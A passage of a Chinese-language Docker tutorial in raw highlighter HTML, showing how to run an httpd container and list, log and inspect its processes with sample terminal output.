class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container run -d -p 80:80 httpd\r\nUnable to find image 'httpd:latest' locally\r\nlatest: Pulling from library/httpd\r\n3d77ce4481b1: Pull complete\r\n73674f4d9403: Pull complete\r\nd266646f40bd: Pull complete\r\nce7b0dda0c9f: Pull complete\r\n01729050d692: Pull complete\r\n014246127c67: Pull complete\r\n7cd2e04cf570: Pull complete\r\nDigest: sha256:f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617\r\nStatus: Downloaded newer image for httpd:latest\r\nc46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0a7523098532-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0a7523098532-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0a7523098532-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0a7523098532-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0a7523098532-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0a7523098532-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0a7523098532-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0a7523098532-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0a7523098532-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0a7523098532-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0a7523098532-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0a7523098532-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0a7523098532-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0a7523098532-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0a7523098532-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container run -d -p 80:80 httpd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0a7523098532-2\"><span class=\"crayon-e\">Unable </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">find </span><span class=\"crayon-i\">image</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'httpd:latest'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">locally</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0a7523098532-3\"><span class=\"crayon-v\">latest</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pulling </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">library</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">httpd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0a7523098532-4\"><span class=\"crayon-cn\">3d77ce4481b1</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0a7523098532-5\"><span class=\"crayon-cn\">73674f4d9403</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0a7523098532-6\"><span class=\"crayon-v\">d266646f40bd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0a7523098532-7\"><span class=\"crayon-v\">ce7b0dda0c9f</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0a7523098532-8\"><span class=\"crayon-cn\">01729050d692</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0a7523098532-9\"><span class=\"crayon-cn\">014246127c67</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0a7523098532-10\"><span class=\"crayon-cn\">7cd2e04cf570</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0a7523098532-11\"><span class=\"crayon-v\">Digest</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sha256</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0a7523098532-12\"><span class=\"crayon-v\">Status</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloaded </span><span class=\"crayon-e\">newer </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">latest</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0a7523098532-13\"><span class=\"crayon-i\">c46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0a7523098532-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>Docker 的 <code>run</code> 命令将镜像名作为强制参数，另外还有很多可选参数。常用的参数有：</p>\n<ul>\n<li><code>-d</code>：从当前 shell 脱离容器</li>\n<li><code>-p X:Y</code>：绑定容器的端口 Y 到宿主机的端口 X</li>\n<li><code>--name</code>：命名你的容器。如果未指定，它将被赋予随机生成的名字</li>\n<li><code>-e</code>：当启动容器时传递环境编辑及其值</li>\n</ul>\n<p>通过以上输出你可以看到，我们将 <code>httpd</code> 作为镜像名来运行容器。接着，本地镜像没有找到，Docker 引擎从 Docker Hub 拉取了它。注意，它下载了镜像 <code>httpd:latest</code>， 其中 <code>:</code> 后面跟着版本号。如果你需要运行特定版本的容器，你可以在镜像名后面注明版本名。如果不提供版本名，Docker 引擎会自动拉取最新的版本。</p>\n<p>输出的最后一行显示了你新运行的 httpd 容器的唯一 ID。</p>\n<h3 id=\"toc_2\">如何列出所有运行中的 Docker 容器？</h3>\n<p>现在，你的容器已经运行起来了，你可能想要确认这一点，或者你想要列出你的机器上运行的所有容器。你可以使用 <code>docker container ls</code> 命令。在旧的 Docker 版本中，对应的命令为 <code>docker ps</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0b3214633419\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   11 minutes ago      Up 11 minutes       0.0.0.0:80-&gt;80/tcp   cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0b3214633419-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0b3214633419-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0b3214633419-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0b3214633419-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0b3214633419-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0b3214633419-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS                </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0b3214633419-3\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-i\">Up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">minutes</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tcp   </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0b3214633419-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>列出的结果是按列显示的。每一列的值分别为：</p>\n<ol>\n<li>Container ID ：一开始的几个字符对应你的容器的唯一 ID</li>\n<li>Image ：你运行容器的镜像名</li>\n<li>Command ：容器启动后运行的命令</li>\n<li>Created ：创建时间</li>\n<li>Status ：容器当前状态</li>\n<li>Ports ：与宿主端口相连接的端口信息</li>\n<li>Names ：容器名（如果你没有命名你的容器，那么会随机创建）</li>\n</ol>\n<h3 id=\"toc_3\">如何查看 Docker 容器的历史纪录？</h3>\n<p>在第一步我们使用了 <code>-d</code> 参数来将容器，在它一开始运行的时候，就从当前的 shell 中脱离出来。在这种情况下，我们不知道容器里面发生了什么。所以为了查看容器的历史纪录，Docker 提供了 <code>logs</code> 命令。它采用容器名称或 ID 作为参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0b8471464904\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container logs cranky_cori\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\n[Thu May 31 18:35:07.301158 2018] [mpm_event:notice] [pid 1:tid 139734285989760] AH00489: Apache/2.4.33 (Unix) configured -- resuming normal operations\r\n[Thu May 31 18:35:07.305153 2018] [core:notice] [pid 1:tid 139734285989760] AH00094: Command line: 'httpd -D FOREGROUND'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0b8471464904-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0b8471464904-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0b8471464904-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0b8471464904-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0b8471464904-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0b8471464904-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0b8471464904-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container logs cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0b8471464904-2\"><span class=\"crayon-v\">AH00558</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Could </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">reliably </span><span class=\"crayon-e\">determine </span><span class=\"crayon-e\">the </span><span class=\"crayon-i\">server</span><span class=\"crayon-s\">'s fully qualified domain name, using 172.17.0.2. Set the '</span><span class=\"crayon-i\">ServerName</span><span class=\"crayon-s\">' directive globally to suppress this message</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0b8471464904-3\"><span class=\"crayon-s\">AH00558: httpd: Could not reliably determine the server'</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fully </span><span class=\"crayon-e\">qualified </span><span class=\"crayon-e\">domain </span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">using</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.17.0.2.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Set </span><span class=\"crayon-i\">the</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'ServerName'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">directive </span><span class=\"crayon-e\">globally </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">suppress </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">message</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0b8471464904-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07.301158</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">mpm_event</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">notice</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">tid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">139734285989760</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AH00489</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Apache</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2.4.33</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Unix</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">configured</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">resuming </span><span class=\"crayon-e\">normal </span><span class=\"crayon-i\">operations</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0b8471464904-5\"><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07.305153</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">core</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">notice</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">tid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">139734285989760</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AH00094</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Command </span><span class=\"crayon-v\">line</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'httpd -D FOREGROUND'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0b8471464904-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0031 seconds] -->\r\n<p>这里我使用了容器名称作为参数。你可以看到在我们的 httpd 容器中与 Apache 相关的历史纪录。</p>\n<h3 id=\"toc_4\">如何确定 Docker 容器的进程？</h3>\n<p>容器是一个使用宿主资源来运行的进程。这样，你可以在宿主系统的进程表中定位容器的进程。让我们在宿主系统上确定容器进程。</p>\n<p>Docker 使用著名的 <code>top</code> 命令作为子命令的名称，来查看容器产生的进程。它采用容器的名称或 ID 作为参数。在旧版本的 Docker 中，只可运行 <code>docker top</code> 命令。在新版本中，<code>docker top</code> 和 <code>docker container top</code> 命令都可以生效。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7536da0bd653676040\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container top  cranky_cori\r\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\r\nroot                15702               15690               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15729               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15730               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15731               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\n\r\nroot@kerneltalks # ps -ef |grep -i 15702\r\nroot     15702 15690  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15729 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15730 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15731 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nroot     15993 15957  0 18:59 pts/0    00:00:00 grep --color=auto -i 15702\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0bd653676040-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0bd653676040-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0bd653676040-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0bd653676040-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0bd653676040-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0bd653676040-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0bd653676040-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0bd653676040-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0bd653676040-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0bd653676040-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0bd653676040-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0bd653676040-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7536da0bd653676040-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7536da0bd653676040-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7536da0bd653676040-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container top  cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7536da0bd653676040-2\"><span class=\"crayon-e\">UID                 </span><span class=\"crayon-e\">PID                 </span><span class=\"crayon-i\">PPID</span><span class=\"crayon-h\">                </span><span class=\"crayon-i\">C</span><span class=\"crayon-h\">                   </span><span class=\"crayon-e\">STIME               </span><span class=\"crayon-e\">TTY                 </span><span class=\"crayon-e\">TIME                </span><span class=\"crayon-e\">CMD</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7536da0bd653676040-3\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15690</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span 